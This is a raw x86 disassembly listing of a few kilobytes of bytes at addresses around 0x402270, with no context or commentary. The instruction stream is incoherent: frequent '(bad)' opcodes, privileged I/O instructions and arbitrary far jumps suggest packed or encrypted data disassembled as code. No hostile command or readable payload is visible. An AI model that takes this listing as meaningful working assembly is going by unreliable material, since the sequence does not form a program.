  40226c:	mov    ebx,0x243c0f95
  402271:	add    esi,edi
  402273:	(bad)  [esi-0x7829be87]
  402279:	outs   dx,BYTE PTR ds:[esi]
  40227a:	retf   
  40227b:	push   edx
  40227c:	hlt    
  40227d:	shl    ebp,cl
  40227f:	jbe    0x40223f
  402281:	(bad)  
  402282:	loop   0x402284
  402284:	inc    eax
  402285:	push   edi
  402286:	mov    WORD PTR [eax-0x14eddea9],ds
  40228c:	mov    dh,0x19
  40228e:	imul   ecx,esp,0xff32f0a8
  402294:	adc    ebp,edi
  402296:	ins    BYTE PTR es:[edi],dx
  402297:	or     BYTE PTR [edi-0x57ead574],0x35
  40229e:	adc    eax,0x9d7fffc1
  4022a3:	xor    BYTE PTR ds:0xa64ec59f,ch
  4022a9:	pop    edi
  4022aa:	xor    ebp,ebx
  4022ac:	sbb    al,0x24
  4022ae:	add    esp,edi
  4022b0:	jp     0x402301
  4022b2:	int3   
  4022b3:	arpl   WORD PTR [ebp+ebx*8-0x6b],si
  4022b7:	call   0x3836:0x5c571439
  4022be:	push   ss
  4022bf:	mov    ebx,0x134dae03
  4022c4:	dec    edi
  4022c5:	into   
  4022c6:	push   edi
  4022c7:	push   eax
  4022c8:	cmp    bh,BYTE PTR [eax-0x6700fcf3]
  4022ce:	mov    ebp,ds
  4022d0:	jmp    0x40232a
  4022d2:	test   BYTE PTR [edi],cl
  4022d4:	dec    ebx
  4022d5:	int    0x67
  4022d7:	je     0x402332
  4022d9:	sti    
  4022da:	aas    
  4022db:	sub    eax,0xb50e9f4c
  4022e0:	sar    DWORD PTR [edi+ebp*1+0x5515fb8],1
  4022e7:	jp     0x4022d6
  4022e9:	sub    al,0x81
  4022eb:	cmc    
  4022ec:	(bad)
  4022f0:	(bad)  [eax+ebx*2]
  4022f3:	rcl    DWORD PTR ds:0xa89dde4,0x76
  4022fa:	adc    DWORD PTR [ebx+ecx*1+0x67],ebx
  4022fe:	dec    edx
  4022ff:	(bad)  
  402300:	ds (bad) 
  402304:	sub    dl,ch
  402306:	ins    BYTE PTR es:[edi],dx
  402307:	push   ss
  402308:	frstor [edx-0x28470f8d]
  40230e:	rol    BYTE PTR [ecx-0x2],0x9a
  402312:	test   al,0x94
  402314:	mov    eax,0xcbd826da
  402319:	data16 jno 0x402372
  40231c:	pop    esp
  40231d:	mov    ch,0x7a
  40231f:	mov    ch,0xf7
  402321:	das    
  402322:	mov    bh,BYTE PTR [edi]
  402324:	pop    edx
  402325:	in     eax,dx
  402326:	call   0xa775:0x9f4e3555
  40232d:	sbb    DWORD PTR [esi+eax*2],edx
  402330:	hlt    
  402331:	adc    eax,ebx
  402333:	xor    dl,dh
  402335:	fisubr WORD PTR [ebx-0x40]
  402338:	nop
  402339:	pop    esp
  40233a:	xor    ebx,DWORD PTR [esi+0x7ee3fcec]
  402340:	mov    esi,ss
  402342:	add    eax,0xe64f4843
  402347:	xor    al,0xa4
  402349:	mov    al,ds:0xfcdfa70
  40234e:	fcomp  st(2)
  402350:	jp     0x402351
  402352:	mov    DWORD PTR [edx],esp
  402354:	aam    0x8b
  402356:	sub    ebp,ebx
  402358:	xchg   esi,eax
  402359:	adc    eax,0xdbf26b92
  40235e:	push   ds
  40235f:	inc    eax
  402360:	sub    ecx,DWORD PTR [eax]
  402362:	outs   dx,BYTE PTR ds:[esi]
  402363:	unpcklps xmm0,XMMWORD PTR ds:0x5bece01e
  40236a:	or     esi,DWORD PTR [ebx]
  40236c:	in     al,0x2b
  40236e:	xor    al,0xc9
  402370:	jbe    0x4023b0
  402372:	jle    0x4023de
  402374:	repz pop edx
  402376:	leave  
  402377:	fsub   QWORD PTR [ecx-0x57de45c7]
  40237d:	jle    0x4023c6
  40237f:	ins    DWORD PTR es:[edi],dx
  402380:	iret   
  402381:	cmp    ebx,esp
  402383:	(bad)  
  402384:	cmc    
  402385:	mov    eax,0xeb200df9
  40238a:	and    BYTE PTR [edi+0x5f],ah
  40238d:	pop    esp
  40238e:	lea    esp,[ebp-0x80]
  402391:	into   
  402392:	inc    ebp
  402393:	push   eax
  402394:	shr    ecx,cl
  402396:	je     0x40231b
  402398:	pop    ebp
  402399:	add    al,0xb2
  40239b:	and    bl,BYTE PTR [eax+eiz*4]
  40239e:	mov    dh,BYTE PTR [ebx-0x11]
  4023a1:	inc    edx
  4023a2:	nop
  4023a3:	mov    al,0x58
  4023a5:	inc    ebx
  4023a6:	loopne 0x4023a4
  4023a8:	mov    ebx,0x9eeb898e
  4023ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ae:	ror    BYTE PTR [ecx+0x6973a023],cl
  4023b4:	add    BYTE PTR [ebx+ebp*2],ch
  4023b7:	int    0x26
  4023b9:	inc    ebx
  4023ba:	popa   
  4023bb:	in     al,dx
  4023bc:	xchg   edx,eax
  4023bd:	jge    0x402392
  4023bf:	in     al,dx
  4023c0:	cmp    eax,0xd783d49f
  4023c5:	dec    ecx
  4023c6:	or     al,0x5c
  4023c8:	inc    edx
  4023c9:	(bad)  
  4023ca:	sbb    BYTE PTR [edx],cl
  4023cc:	jbe    0x4023e8
  4023ce:	xchg   ebx,eax
  4023cf:	lahf   
  4023d0:	lock in al,dx
  4023d2:	fwait
  4023d3:	inc    edi
  4023d4:	or     bl,ah
  4023d6:	push   ecx
  4023d7:	mov    ah,0xfa
  4023d9:	push   ss
  4023da:	(bad)  
  4023db:	retf   
  4023dc:	sub    DWORD PTR [edi-0x5d],esp
  4023df:	inc    edx
  4023e0:	cli    
  4023e1:	sub    ch,BYTE PTR [ecx+0xd]
  4023e4:	pop    ss
  4023e5:	faddp  st(3),st
  4023e7:	ja     0x4023bd
  4023e9:	fxtract 
  4023eb:	push   edi
  4023ec:	ffreep st(3)
  4023ee:	pop    ds
  4023ef:	xchg   BYTE PTR [ebx],dh
  4023f1:	gs and al,0x6
  4023f4:	paddb  mm3,QWORD PTR [ebp+eiz*2+0x3a2a2b7c]
  4023fc:	ins    BYTE PTR es:[edi],dx
  4023fd:	inc    ecx
  4023fe:	adc    DWORD PTR [eax],esi
  402400:	adc    ebp,esi
  402402:	jo     0x4023de
  402404:	or     DWORD PTR [edi-0x36],ebp
  402407:	or     edx,DWORD PTR [edx]
  402409:	clc    
  40240a:	ja     0x402460
  40240c:	or     BYTE PTR [edi-0x42],0xb4
  402410:	pop    edi
  402411:	pusha  
  402412:	dec    ebx
  402413:	jp     0x402435
  402415:	div    BYTE PTR [edx]
  402417:	add    edx,DWORD PTR [edi+0x16]
  40241a:	stos   BYTE PTR es:[edi],al
  40241b:	mov    al,ds:0x20858033
  402420:	mov    BYTE PTR [ebx-0x2fa21792],bl
  402426:	sbb    edi,DWORD PTR [ebx+0x29]
  402429:	dec    edi
  40242a:	sub    eax,0xc20f0046
  40242f:	out    dx,eax
  402430:	hlt    
  402431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402432:	gs call 0xcb40:0xaa14d7af
  40243a:	scas   al,BYTE PTR es:[edi]
  40243b:	rcl    bl,0x64
  40243e:	rol    edi,0xf4
  402441:	mov    dh,0xb9
  402443:	test   al,0x21
  402445:	push   0x5fe1e219
  40244a:	jns    0x4023ff
  40244c:	inc    edx
  40244d:	sti    
  40244e:	cmp    BYTE PTR [esi-0x3ed58d83],cl
  402454:	add    al,0xc4
  402456:	test   eax,0xc597c446
  40245b:	fistp  DWORD PTR [eax]
  40245d:	and    eax,0x7d3ba378
  402462:	out    dx,eax
  402463:	sub    al,0xee
  402465:	adc    eax,0x829d5d7e
  40246a:	xchg   esi,eax
  40246b:	(bad)  
  40246c:	xor    DWORD PTR [ecx-0x17],edx
  40246f:	cmp    eax,0x5ed07190
  402474:	sahf   
  402475:	sbb    eax,0xfb6b23ec
  40247a:	pop    edx
  40247b:	bound  ebp,QWORD PTR [esi-0x37ea2bb]
  402481:	mov    esi,0x9542581b
  402486:	inc    eax
  402487:	js     0x4024d8
  402489:	repnz test ebp,edi
  40248c:	popa   
  40248d:	dec    esp
  40248e:	ins    DWORD PTR es:[edi],dx
  40248f:	adc    ebp,DWORD PTR [ecx]
  402491:	or     eax,0x234764f4
  402496:	adc    edx,edi
  402498:	push   esp
  402499:	and    al,0xfc
  40249b:	sub    BYTE PTR [eax],al
  40249d:	shl    bh,cl
  40249f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024a1:	addr16 jae 0x402484
  4024a4:	xchg   bl,cl
  4024a6:	xor    BYTE PTR [edi-0x4d],dh
  4024a9:	sub    al,0x69
  4024ab:	sub    BYTE PTR [ecx+0x586dbbb],bh
  4024b1:	call   0xfeb1b10f
  4024b6:	jb     0x4024c1
  4024b8:	pop    edi
  4024b9:	stc    
  4024ba:	sbb    eax,0xc8fe2c52
  4024bf:	xchg   ebx,eax
  4024c0:	std    
  4024c1:	shl    BYTE PTR [ebx-0x66],cl
  4024c4:	iret   
  4024c5:	mov    dh,0xfa
  4024c7:	xor    esi,ebp
  4024c9:	in     al,0x99
  4024cb:	retf   
  4024cc:	xlat   BYTE PTR ds:[ebx]
  4024cd:	push   ss
  4024ce:	xchg   DWORD PTR [edi+ecx*4+0x5c90ad88],esp
  4024d5:	(bad)  
  4024d6:	mov    ecx,0x59b1913c
  4024db:	ret    
  4024dc:	jns    0x402515
  4024de:	and    eax,0xa81d7934
  4024e3:	mov    ds,WORD PTR [ebx+0x57f218b2]
  4024e9:	das    
  4024ea:	cdq    
  4024eb:	sbb    al,BYTE PTR [esi]
  4024ed:	pop    esi
  4024ee:	pop    ecx
  4024ef:	iret   
  4024f0:	push   edi
  4024f1:	out    0xe2,al
  4024f3:	aas    
  4024f4:	stos   BYTE PTR es:[edi],al
  4024f5:	dec    ecx
  4024f6:	adc    esi,DWORD PTR [edx+0x6b]
  4024f9:	or     ch,ah
  4024fb:	cmp    ebx,ebx
  4024fd:	add    DWORD PTR [ebx],edx
  4024ff:	cmc    
  402500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402501:	inc    ecx
  402502:	push   cs
  402503:	sbb    al,0xda
  402505:	mov    dh,0xa9
  402507:	inc    ecx
  402508:	dec    edi
  402509:	jmp    0xf85b:0xf910a7e1
  402510:	jg     0x40251d
  402512:	popf   
  402513:	sti    
  402514:	xor    al,dh
  402516:	shl    DWORD PTR [edx],0xad
  402519:	mov    dl,0x62
  40251b:	xor    eax,0x2302039e
  402520:	or     DWORD PTR [edi-0x5b],edx
  402523:	test   al,0xe3
  402525:	popf   
  402526:	popa   
  402527:	xor    al,0x6a
  402529:	ret    0x939
  40252c:	(bad)  
  40252d:	(bad)
  402531:	sub    BYTE PTR [edx],ch
  402533:	sbb    bh,cl
  402535:	outs   dx,DWORD PTR ds:[esi]
  402536:	pushf  
  402537:	ja     0x402516
  402539:	push   es
  40253a:	xchg   ecx,eax
  40253b:	mov    bh,BYTE PTR [edi]
  40253d:	(bad)  
  40253f:	and    bh,0x6a
  402542:	das    
  402543:	cmp    eax,0xe273e18c
  402548:	fild   QWORD PTR [edi+0x20a2a13]
  40254e:	dec    esi
  40254f:	sub    eax,0x84ebe422
  402554:	gs dec edi
  402556:	sbb    bl,BYTE PTR [esi+0x10]
  402559:	inc    edi
  40255a:	mov    dl,0x69
  40255c:	pusha  
  40255d:	cmp    al,BYTE PTR [esi]
  40255f:	adc    al,0x76
  402561:	std    
  402562:	and    BYTE PTR [edx-0x42f834bc],ch
  402568:	xor    dh,BYTE PTR [ebx-0x77]
  40256b:	sti    
  40256c:	sub    BYTE PTR ds:0x4e2202d6,dh
  402572:	shl    BYTE PTR [eax-0x51b4240e],cl
  402578:	adc    BYTE PTR [eax],dh
  40257a:	jmp    0x40259a
  40257c:	jmp    0xed456719
  402581:	mov    bh,0x8e
  402583:	enter  0x217c,0x9
  402587:	mov    BYTE PTR [edi+eiz*2+0x66],ah
  40258b:	pop    ds
  40258c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40258d:	or     al,0x46
  40258f:	in     eax,dx
  402590:	hlt    
  402591:	call   0xe3ef7a70
  402596:	pop    ebx
  402597:	(bad)  
  402598:	mov    cs,WORD PTR [ecx+0x72]
  40259b:	dec    eax
  40259c:	inc    eax
  40259d:	div    BYTE PTR [edx]
  40259f:	mov    cl,0x2e
  4025a1:	add    esi,DWORD PTR [eax-0xc]
  4025a4:	neg    DWORD PTR [ecx-0xb]
  4025a7:	and    BYTE PTR [eax],ch
  4025a9:	inc    edi
  4025aa:	icebp  
  4025ab:	or     ch,BYTE PTR [ecx-0x75]
  4025ae:	in     eax,dx
  4025af:	rcl    DWORD PTR [esp+edi*1],1
  4025b2:	dec    ebx
  4025b3:	(bad)  
  4025b5:	cmc    
  4025b6:	mov    esi,ecx
  4025b8:	out    dx,al
  4025b9:	jl     0x4025e9
  4025bb:	jb     0x4025d3
  4025bd:	es (bad) 
  4025bf:	out    0xce,al
  4025c1:	xchg   DWORD PTR [ebx+esi*8+0x6d],esp
  4025c5:	ret    
  4025c6:	push   edi
  4025c7:	mov    eax,0xaac31c50
  4025cc:	jo     0x40260a
  4025ce:	(bad)  
  4025cf:	data16 int 0xe8
  4025d2:	stos   BYTE PTR es:[edi],al
  4025d3:	aas    
  4025d4:	push   eax
  4025d5:	scas   al,BYTE PTR es:[edi]
  4025d6:	clc    
  4025d7:	test   eax,0xb45d2375
  4025dc:	int    0xb4
  4025de:	push   0xfffffffb
  4025e0:	jns    0x4025db
  4025e2:	inc    ebp
  4025e3:	xor    dl,BYTE PTR [ebx+0x7c495c07]
  4025e9:	cmp    ah,BYTE PTR [ecx+ecx*4+0x19ca79bf]
  4025f0:	cmp    BYTE PTR [edi+0x4a3cead6],cl
  4025f6:	mov    ebp,0xcf1c6f71
  4025fb:	js     0x4025be
  4025fd:	ret    
  4025fe:	lods   al,BYTE PTR ds:[esi]
  4025ff:	fdivr  st(1),st
  402601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402602:	enter  0x2538,0xcc
  402606:	retf   0x3c38
  402609:	mov    eax,0x8b5e269b
  40260e:	pop    ebp
  40260f:	push   ss
  402610:	rcl    BYTE PTR [edi-0x80],1
  402613:	mov    eax,0xdf397012
  402618:	jb     0x40264d
  40261a:	push   ds
  40261b:	mov    edi,0x2989908e
  402620:	(bad)  
  402621:	cld    
  402622:	add    cl,BYTE PTR [esi]
  402624:	sahf   
  402625:	jne    0x402693
  402627:	cmp    ecx,edx
  402629:	and    ebx,DWORD PTR [eax]
  40262b:	out    dx,al
  40262c:	jl     0x402675
  40262e:	mov    esi,0xd12703bd
  402633:	mov    dh,0xd0
  402635:	and    al,0x84
  402637:	push   edx
  402638:	pop    ebx
  402639:	mov    bh,0x68
  40263b:	xor    ebp,ecx
  40263d:	das    
  40263e:	push   0x69630ff5
  402643:	xlat   BYTE PTR ds:[ebx]
  402644:	xchg   DWORD PTR [edi-0x52],edx
  402647:	sbb    al,ch
  402649:	sti    
  40264a:	sub    ecx,ecx
  40264c:	push   cs
  40264d:	ret    
  40264e:	jo     0x4025e2
  402650:	(bad)  
  402651:	cmp    al,0x5d
  402653:	out    dx,al
  402654:	in     eax,0xd2
  402656:	lds    eax,FWORD PTR [edx+0x52920327]
  40265c:	mov    BYTE PTR [edi-0x6f905f0],dh
  402662:	inc    eax
  402663:	pop    ebx
  402664:	pop    ecx
  402665:	xchg   ebx,eax
  402666:	loope  0x40260d
  402668:	cmp    BYTE PTR [ebx+0x3a08b2f4],ch
  40266e:	or     cl,BYTE PTR [ecx+0x5b]
  402671:	and    eax,0x75186beb
  402676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402677:	pop    ebx
  402678:	outs   dx,DWORD PTR ds:[esi]
  402679:	add    eax,0x501a6864
  40267e:	sub    al,0xc
  402680:	mov    ebx,DWORD PTR [esi-0x4bff661]
  402686:	and    edx,DWORD PTR [ebx]
  402688:	ss mov ch,0x9
  40268b:	mov    bl,0x3d
  40268d:	xor    dl,BYTE PTR [ebx+0x67]
  402690:	cmp    eax,0x9971947a
  402695:	jns    0x4026de
  402697:	mov    esi,0xece6199c
  40269c:	sbb    BYTE PTR [edi-0x6c],ah
  40269f:	fwait
  4026a0:	mov    ecx,0x7bf27613
  4026a5:	xchg   edx,eax
  4026a6:	test   eax,0x47d6325f
  4026ab:	(bad)  
  4026ac:	scas   ax,WORD PTR es:[edi]
  4026ae:	std    
  4026af:	add    eax,edi
  4026b1:	sub    al,0x3e
  4026b3:	inc    esi
  4026b4:	pop    ds
  4026b5:	ins    BYTE PTR es:[edi],dx
  4026b6:	loop   0x40270e
  4026b8:	shl    bl,0x9d
  4026bb:	push   esp
  4026bc:	jns    0x402646
  4026be:	xchg   BYTE PTR [eax],dh
  4026c0:	or     esi,ebp
  4026c2:	lea    edx,[ebp+ebx*2-0x218a34db]
  4026c9:	lods   al,BYTE PTR ds:[esi]
  4026ca:	fisub  WORD PTR [ebx]
  4026cc:	ret    0x82e2
  4026cf:	adc    al,0x3d
  4026d1:	cmp    DWORD PTR [ebx+0x5591495b],ebx
  4026d7:	xor    al,0xd0
  4026d9:	xchg   esp,eax
  4026da:	ja     0x40274a
  4026dc:	xchg   esi,eax
  4026dd:	and    DWORD PTR [ebx],ebx
  4026df:	(bad)  
  4026e0:	out    dx,eax
  4026e1:	or     BYTE PTR [esi+eax*1+0x1b],ch
  4026e5:	fs sbb edi,esi
  4026e8:	sbb    al,0x4d
  4026ea:	xor    al,0xbd
  4026ec:	scas   al,BYTE PTR es:[edi]
  4026ed:	push   ebx
  4026ee:	add    eax,0x16ebc55
  4026f3:	clc    
  4026f4:	pushf  
  4026f5:	xor    DWORD PTR [edi-0x5d],0x33
  4026f9:	jne    0x402768
  4026fb:	hlt    
  4026fc:	inc    esi
  4026fd:	pop    ebx
  4026fe:	mov    dl,0xa8
  402700:	jno    0x4026c9
  402702:	imul   eax,DWORD PTR [edx+edi*1],0x37ebc459
  402709:	jmp    0x7c55:0xa2ed2bc9
  402710:	push   esp
  402711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402712:	add    esp,DWORD PTR [eax-0x616fac93]
  402718:	dec    eax
  402719:	ins    DWORD PTR es:[edi],dx
  40271a:	aaa    
  40271b:	test   BYTE PTR [edi-0x22],bh
  40271e:	lahf   
  40271f:	dec    ebx
  402720:	fisttp DWORD PTR [esi-0x5d5d43ef]
  402726:	cmp    ebx,DWORD PTR [edi]
  402728:	xchg   esi,eax
  402729:	jb     0x4026fe
  40272b:	pop    esp
  40272c:	sahf   
  40272d:	rcpps  xmm3,xmm0
  402730:	jl     0x402783
  402732:	icebp  
  402733:	or     esp,esi
  402735:	jo     0x4026dd
  402737:	jmp    0x79cb68de
  40273c:	and    edi,DWORD PTR [edi+0x2f]
  40273f:	push   esp
  402740:	imul   edx,DWORD PTR [esi],0x912673c2
  402746:	adc    eax,0x376f8af7
  40274b:	mov    edi,0x429ac105
  402750:	mov    al,ds:0x586a7a08
  402755:	rcl    DWORD PTR [ebx+0x6dcfadc5],1
  40275b:	push   edi
  40275c:	cdq    
  40275d:	push   ss
  40275e:	push   esp
  40275f:	adc    al,0xd
  402761:	retf   
  402762:	cmp    ah,BYTE PTR [ebx+0x422eedc0]
  402768:	adc    ch,ch
  40276a:	scas   eax,DWORD PTR es:[edi]
  40276b:	and    BYTE PTR [ecx+0x4f],cl
  40276e:	jle    0x4027a4
  402770:	cld    
  402771:	xor    al,0xf5
  402773:	das    
  402774:	test   BYTE PTR [eax],0xd4
  402777:	jb     0x40273e
  402779:	cmc    
  40277a:	and    eax,0x4a394095
  40277f:	pop    ss
  402780:	nop
  402781:	sti    
  402782:	ins    BYTE PTR es:[edi],dx
  402783:	shl    DWORD PTR [ebx+0x34],0xb5
  402787:	jmp    0x402787
  402789:	ror    DWORD PTR [edx-0x70],1
  40278c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40278d:	jmp    0x1a8b:0xf8efe76c
  402794:	(bad)  
  402795:	arpl   WORD PTR [edi-0x73881b2b],sp
  40279b:	cmp    DWORD PTR [edi+0x30356268],eax
  4027a1:	push   esi
  4027a2:	pop    ebp
  4027a3:	mov    eax,0x76b04c96
  4027a8:	mov    ?,WORD PTR [eax]
  4027aa:	jnp    0x40276e
  4027ac:	(bad)  
  4027ad:	in     al,dx
  4027ae:	xchg   esi,eax
  4027af:	add    BYTE PTR [esi],bl
  4027b1:	(bad)  
  4027b6:	call   0x5078:0x4111ede5
  4027bd:	sbb    esi,ebx
  4027bf:	xor    al,0x7e
  4027c1:	add    eax,0xf6bad1
  4027c6:	pop    esp
  4027c7:	adc    BYTE PTR [esi+0x3f06555c],ch
  4027cd:	popa   
  4027ce:	imul   BYTE PTR [esp+eax*2-0x69]
  4027d2:	mov    ch,0x49
  4027d4:	shl    BYTE PTR [esi-0x1342e023],1
  4027da:	stos   DWORD PTR es:[edi],eax
  4027db:	dec    ecx
  4027dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027dd:	imul   ebp,DWORD PTR [ecx],0x19
  4027e0:	int    0xbf
  4027e2:	xchg   ebp,eax
  4027e3:	hlt    
  4027e4:	lock ds std 
  4027e7:	or     ebx,DWORD PTR [eax-0xb5b928]
  4027ed:	sbb    eax,0x165b4973
  4027f2:	add    edx,edi
  4027f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f5:	ds pop esp
  4027f7:	clc    
  4027f8:	push   esi
  4027f9:	lods   al,BYTE PTR ds:[esi]
  4027fa:	adc    eax,0xf1ad64dd
  4027ff:	adc    ebx,edi
  402801:	mov    dl,BYTE PTR fs:[edi+0x1]
  402805:	test   BYTE PTR [eax],0x1c
  402808:	mov    ah,0xe0
  40280a:	sbb    cl,BYTE PTR [ebx]
  40280c:	test   BYTE PTR [ebx+0x31],cl
  40280f:	imul   esp,ecx,0xfffffff9
  402812:	pop    ds
  402813:	mov    bl,0x61
  402815:	shl    DWORD PTR [ecx+0x50800cd4],cl
  40281b:	rcl    cl,0xb3
  40281e:	mov    ch,bl
  402820:	mov    esp,0xae4af3a9
  402825:	repz jb 0x402864
  402828:	add    eax,0x72c385d8
  40282d:	xchg   dl,ah
  40282f:	pop    ecx
  402830:	dec    edx
  402831:	or     BYTE PTR [eax],dl
  402833:	mov    ss,WORD PTR [edx+0x59]
  402836:	mov    eax,0x5ad18582
  40283b:	mov    bh,0xc3
  40283d:	push   eax
  40283e:	xchg   ebx,eax
  40283f:	push   ecx
  402840:	test   BYTE PTR [esi+0x1fdc87ec],cl
  402846:	fadd   QWORD PTR [ecx-0x6e3b9ace]
  40284c:	pop    edx
  40284d:	xlat   BYTE PTR ds:[ebx]
  40284e:	int    0xfb
  402850:	sbb    BYTE PTR [edx],cl
  402852:	(bad)  
  402853:	push   0x31f1f0b6
  402858:	mov    DWORD PTR [edx],edi
  40285a:	stos   BYTE PTR es:[edi],al
  40285b:	enter  0x71f1,0x22
  40285f:	adc    BYTE PTR [ecx],bl
  402861:	das    
  402862:	hlt    
  402863:	daa    
  402864:	mov    ss,WORD PTR [edx]
  402866:	(bad)  
  402867:	daa    
  402868:	cmp    al,0x9
  40286a:	iret   
  40286b:	ins    DWORD PTR es:[edi],dx
  40286c:	or     al,0x36
  40286e:	mov    ch,0x28
  402870:	dec    esi
  402871:	repz adc esi,DWORD PTR [edi-0x45]
  402875:	repnz mov ah,0xa0
  402878:	neg    ebp
  40287a:	ds dec ebx
  40287c:	pop    ebp
  40287d:	(bad)  
  40287e:	cmp    ch,BYTE PTR [edx+0x1c]
  402881:	test   eax,0x5b4a8950
  402886:	adc    BYTE PTR [ecx],al
  402888:	(bad)  
  402889:	aas    
  40288a:	mov    bl,0x80
  40288c:	xor    BYTE PTR [edi-0x20],bl
  40288f:	sbb    BYTE PTR [esi+0x0],dl
  402892:	mov    eax,0x7db11658
  402897:	test   bh,ah
  402899:	mov    edi,0x9686deb0
  40289e:	inc    esi
  40289f:	jecxz  0x402903
  4028a1:	sbb    ebp,DWORD PTR [esp+eiz*4]
  4028a4:	mov    al,ds:0x7f106002
  4028a9:	fstp   DWORD PTR [eax-0x7c2eda1d]
  4028af:	nop
  4028b0:	jecxz  0x402893
  4028b2:	mov    bl,0xf0
  4028b4:	pop    esi
  4028b5:	adc    DWORD PTR [edx+0x63],edx
  4028b8:	cmp    BYTE PTR [edx+0x34],bh
  4028bb:	in     eax,dx
  4028bc:	lahf   
  4028bd:	jbe    0x402859
  4028bf:	loopne 0x40290f
  4028c1:	mov    al,0xe0
  4028c3:	stos   DWORD PTR es:[edi],eax
  4028c4:	mov    esi,0xff314ca2
  4028c9:	nop
  4028ca:	and    edx,DWORD PTR [ebx]
  4028cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028cd:	icebp  
  4028ce:	inc    ecx
  4028cf:	and    al,0x23
  4028d1:	jno    0x4028e6
  4028d3:	jl     0x4028da
  4028d5:	daa    
  4028d6:	(bad)  
  4028d7:	push   esp
  4028d8:	fs pop ss
  4028da:	cwde   
  4028db:	xchg   edi,eax
  4028dc:	cmp    DWORD PTR [edx-0x1dcce567],esi
  4028e2:	fadd   DWORD PTR [ebx+0x43]
  4028e5:	mov    cs,WORD PTR [edx+0x78495501]
  4028eb:	sbb    DWORD PTR [edx-0x1bea9035],ebx
  4028f1:	pop    esp
  4028f2:	xor    DWORD PTR [ebx-0xff09cc2],edi
  4028f8:	push   eax
  4028f9:	mov    ebp,0x9e8083cd
  4028fe:	cmp    ecx,esi
  402900:	rol    DWORD PTR [edi],cl
  402902:	mov    esi,0x4167f1a6
  402907:	sub    ebx,DWORD PTR [esi+0x7c]
  40290a:	fisubr WORD PTR [esi-0x65]
  40290d:	(bad)  
  40290e:	jno    0x4028ec
  402910:	mov    ebx,0x52ce3b81
  402915:	loop   0x4028e4
  402917:	(bad)  
  402918:	dec    edi
  402919:	test   esi,esp
  40291b:	repnz loope 0x40298a
  40291e:	(bad)  
  40291f:	arpl   di,di
  402921:	jne    0x4028d1
  402923:	jne    0x4028c3
  402925:	inc    ebp
  402926:	imul   ecx,edi,0x1b57b67f
  40292c:	push   esi
  40292d:	imul   ebp,DWORD PTR [edx],0x5d
  402930:	or     BYTE PTR [edx+0xef45893],dh
  402936:	(bad)  [ebp-0x10]
  402939:	xlat   BYTE PTR ds:[ebx]
  40293a:	xchg   edi,eax
  40293b:	adc    ah,BYTE PTR [ebx+0x601c17f8]
  402941:	adc    edi,DWORD PTR [ebx-0x20]
  402944:	shr    al,cl
  402946:	outs   dx,DWORD PTR ds:[esi]
  402947:	sar    ecx,cl
  402949:	push   ebx
  40294a:	into   
  40294b:	cld    
  40294c:	mov    cl,0x7f
  40294e:	aam    0xca
  402950:	cmp    BYTE PTR ds:0x6e1328df,dl
  402956:	adc    DWORD PTR [ecx],0x9
  402959:	push   es
  40295a:	and    ah,dh
  40295c:	dec    eax
  40295d:	mov    ebx,0x75fd88d5
  402962:	push   ebx
  402963:	fwait
  402964:	ret    
  402965:	add    DWORD PTR [ecx+0x806e17],ecx
  40296b:	adc    esi,DWORD PTR [ecx-0x31a19895]
  402971:	lea    ebp,[ecx]
  402973:	imul   edi,DWORD PTR [edx+edi*4],0xd60fa4ea
  40297a:	arpl   di,bx
  40297c:	out    0x8,eax
  40297e:	inc    edi
  40297f:	in     eax,0x74
  402981:	xchg   edx,eax
  402982:	mov    bl,0x51
  402984:	cs sub eax,0x8d91b6aa
  40298a:	sub    ah,BYTE PTR [edi-0x407438e]
  402990:	sbb    DWORD PTR [ecx],edx
  402992:	mov    eax,ds:0x424b6660
  402997:	fistp  QWORD PTR [edi+eax*8-0x5b]
  40299b:	enter  0xd24,0x32
  40299f:	mov    cl,0x1a
  4029a1:	mov    BYTE PTR [esi+0x67f33bfc],dh
  4029a7:	lahf   
  4029a8:	xchg   ebp,eax
  4029a9:	jno    0x4029fc
  4029ab:	pop    ecx
  4029ac:	retf   
  4029ad:	jecxz  0x4029a4
  4029af:	sbb    eax,0x8a36022f
  4029b4:	fldcw  WORD PTR [ebp+0x8]
  4029b7:	pop    ecx
  4029b8:	in     al,0x6d
  4029ba:	mov    eax,0xdf3fe744
  4029bf:	sub    DWORD PTR [ebx+0xa],esi
  4029c2:	xchg   ebx,eax
  4029c3:	shl    DWORD PTR [ebp-0x628a5258],cl
  4029c9:	lea    edi,ds:0x89ee3ead
  4029cf:	sub    eax,DWORD PTR [ebp+0x4aa222ae]
  4029d5:	dec    esp
  4029d6:	jo     0x4029a6
  4029d8:	in     al,0xe
  4029da:	add    DWORD PTR [edi-0x67],eax
  4029dd:	cmp    eax,0xfcae6345
  4029e2:	xor    ah,bh
  4029e4:	jno    0x402a5c
  4029e6:	sbb    cl,BYTE PTR [edi+0x1]
  4029e9:	fwait
  4029ea:	lds    esi,FWORD PTR [ebp-0x1b]
  4029ed:	jae    0x4029d4
  4029ef:	(bad)  
  4029f0:	xor    ch,ah
  4029f2:	inc    eax
  4029f3:	test   eax,0xc7d2119a
  4029f8:	loope  0x4029da
  4029fa:	mov    ah,BYTE PTR [ebx-0x8604abe]
  402a00:	inc    ecx
  402a01:	xchg   esi,eax
  402a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a04:	or     DWORD PTR [edx+0x5],ebx
  402a07:	xor    BYTE PTR ds:0x52337e9,bh
  402a0d:	push   ss
  402a0e:	cmp    BYTE PTR [edx],dl
  402a10:	jmp    0x2ef39ac5
  402a15:	stos   DWORD PTR es:[edi],eax
  402a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a17:	jbe    0x402a38
  402a19:	je     0x402a1a
  402a1b:	retf   0xedb5
  402a1e:	pop    ds
